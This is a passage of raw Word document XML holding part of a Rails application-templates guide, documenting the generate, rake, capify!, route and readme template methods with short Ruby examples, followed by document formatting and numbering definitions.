          <w:p w14:paraId="26635346" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>initializer("begin.rb") do</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4B7E6A56" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  puts "Almost done!"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4BC25123" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="03DF4504" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">9.10 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>generate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27676007" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Runs the specified generator where the first argument is the generator name and the remaining arguments are passed directly to the generator.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7200"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="609B97AE" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="43DBC183" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6">
            <w:pPr>
              <w:divId w:val="531845033"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>generate("scaffold", "forums title:string description:text")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4C16C6ED" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">9.11 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rake</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20DA4E56" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Runs the specified Rake task.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2160"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="6C2798CF" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="71FC03B8" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6">
            <w:pPr>
              <w:divId w:val="1402949566"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>rake("db:migrate")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="461E3DDA" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Available options are:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1137A964" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="371"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:env</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – Specifies the environment in which to run this rake task.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F6A28F6" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="371"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:sudo</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> – Whether or not to run this task using </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>sudo</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Defaults to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46B231B8" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">9.12 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>capify!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D2A3D34" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Runs the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>capify</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> command from Capistrano at the root of the application which generates Capistrano configuration.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="840"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="3C107B23" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="187ADA2C" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6">
            <w:pPr>
              <w:divId w:val="1881818332"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>capify!</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5F50CD8C" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">9.13 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>route</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39EA59EA" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Adds text to the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config/routes.rb</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3120"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="788B2197" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6E88289E" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6">
            <w:pPr>
              <w:divId w:val="1333600763"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>route("resources :people")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0C94A927" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">9.14 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>readme</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E29E40E" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Output the contents of a file in the template’s </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>source_path</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, usually a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>README</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1920"/>
      </w:tblGrid>
      <w:tr w:rsidR="00185CB6" w14:paraId="0151D1CC" w14:textId="77777777" w:rsidTr="00185CB6">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="681ED156" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6">
            <w:pPr>
              <w:divId w:val="1733890306"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>readme("README")</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3AEA34C2" w14:textId="77777777" w:rsidR="00185CB6" w:rsidRDefault="00185CB6" w:rsidP="00185CB6"/>
    <w:sectPr w:rsidR="00185CB6" w:rsidSect="005028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44F7D" w14:textId="77777777" w:rsidR="00DF3BF6" w:rsidRDefault="00DF3BF6" w:rsidP="009A002D">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:endnote>
  <w:endnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="1BFBBD78" w14:textId="77777777" w:rsidR="00DF3BF6" w:rsidRDefault="00DF3BF6" w:rsidP="009A0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SimSun">
    <w:altName w:val="宋体"/>
    <w:charset w:val="86"/>
    <w:family w:val="swiss"/>
    <w:pitch w:val="variable"/>
    <w:sig w:usb0="E10002EF" w:usb1="6BDFFCFB" w:usb2="00800036" w:usb3="00000000" w:csb0="003E019F"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A00002BF" w:usb1="68C7FCFB" w:usb2="00000010" w:usb3="00000000" w:csb0="0002009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827243" w14:textId="77777777" w:rsidR="00DF3BF6" w:rsidRDefault="00DF3BF6" w:rsidP="009A002D">
      <w:r>
        <w:separator/>
      </w:r>
    </w:p>
  </w:footnote>
  <w:footnote w:type="continuationSeparator" w:id="0">
    <w:p w14:paraId="6CD7E320" w14:textId="77777777" w:rsidR="00DF3BF6" w:rsidRDefault="00DF3BF6" w:rsidP="009A00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070D6"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0756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7A687C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="627E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916611"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C1BE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A56E49"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="61B0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0C77BBC"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="6490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B93A97"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="D986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0D654B"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="8BEA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2774B17"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="F37E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2D97B3B"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="D786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3743900"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="EA8C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F04668"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="868C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4031995"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="336C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44214AB"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1F90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47D60A4"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="73E82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4D03E3A"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="DDB4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52B7551"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="08D41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53B51FB"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="80EA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66C0492"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0F20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6702919"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B4E2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6A80B03"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="29EE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76D2198"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="F5964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7F85672"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="14008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801500A"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C4E4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81D01B9"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="96A49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81E1B10"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="D996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8A834B4"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="381E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9012401"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C900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9275681"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B7500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92F0A70"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="484A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9332601"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="537E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95B11ED"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C28A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9D267E1"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="D010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A3C4874"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="87A2B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A465B6E"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="ADCA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A4E7F04"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1FA2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A6C0AF5"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="F8768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ABC124B"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="134C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B00241A"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4F06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B697BA9"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="9D4E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B711B79"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="61346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BCB2936"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="8D54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C5A07DF"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="635E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C6400C7"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="178E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CB229FE"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7FD0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CBF3EEE"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="00DE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D5820CE"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="511C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DCA3136"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="5A6C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0DE12B5E"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="E660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0E0E6494"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="8FA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0E603418"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="57A8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0E963C45"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="DDE4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0EBC7B89"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="09BA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0EBE3450"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4084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0F3923E4"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="3CA4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0F50199A"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B83E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0F63042E"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="EC9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0FF84D90"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C5EC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1134217"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="45F6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13603E1"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="DA28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1AE02A2"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4A92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2310F9F"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="D68C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2DD5D71"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="0B90D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3A3766C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C476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4064D24"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="5D7C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44723FB"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="3314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48C7B8B"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="AB2A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4B17409"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7DD6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4DB5748"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4F1A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4EC5C54"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B1C8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5576616"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="2A2A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5BE4BF3"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="E730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5F22C55"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="E72C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5F63D76"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="2410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67548C0"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="603C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6D52646"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="FD3C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6DC38A9"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="E364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6E20256"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="ACDE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7416055"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="F32C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74F6402"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="E67C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854171C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="75D01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86D4049"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="00367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88B46E4"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="BD0C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190B79D3"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="EA28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19835DB1"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="3114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9D11005"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="76D6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19F879C4"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="52D8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A281528"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="CD6A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1A630043"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="8FF6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1AA30EB4"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="715E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1AB25992"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="204A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1ABD723B"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="3D6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1AC40B72"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="71EC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1B222BE1"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="008C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1B2474D3"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="3CFC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1B623DE3"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C96E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1BD85911"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4E8A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1C1B6693"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B1A0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1C397416"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="977E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1C8C52DC"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="03DE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1CE82A01"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="2572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1D2600DF"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1EFA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1D3656AF"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="70C81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1DA86E9F"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="21504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1DCC4B49"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="E610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1E3175CB"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A278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1EB82F25"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="C5FE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1EBA6CF5"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="8236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1EF71181"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4AAC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1EFB45DC"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="96B06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1F4F5065"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="D9D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1F912FA3"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="5E88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20017F0E"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="377C0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0284D1B"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="8DD22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207A0ED6"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="BE28B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0825A4B"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="92B6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0AD37C8"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="442E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20C8590D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="462E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21A61EB2"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="7EFA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229972C6"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="B106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22AD6E4F"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="4CAE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22B40452"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="F3E0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23065AFF"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="78F2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23622182"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="54F0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238D0AFD"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="584A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23B50E14"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="80F2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24434F05"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="95B4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24953433"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="9302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24C83979"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="2D22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24F50D4E"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1BDE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250E358B"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="8B26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2541664C"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="90F2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25567E65"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="5806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257D7712"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="9484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25AC7614"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="6184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26374772"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="54A2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265F4524"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="62A6D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268D216D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="10C6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27632A4D"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="F5F2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28EC2392"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="A926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29026781"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="1F32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29195C45"/>
    <w:multiLevelType w:val="multilevel"/>
    <w:tmpl w:val="FBEC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295D0C78"/>
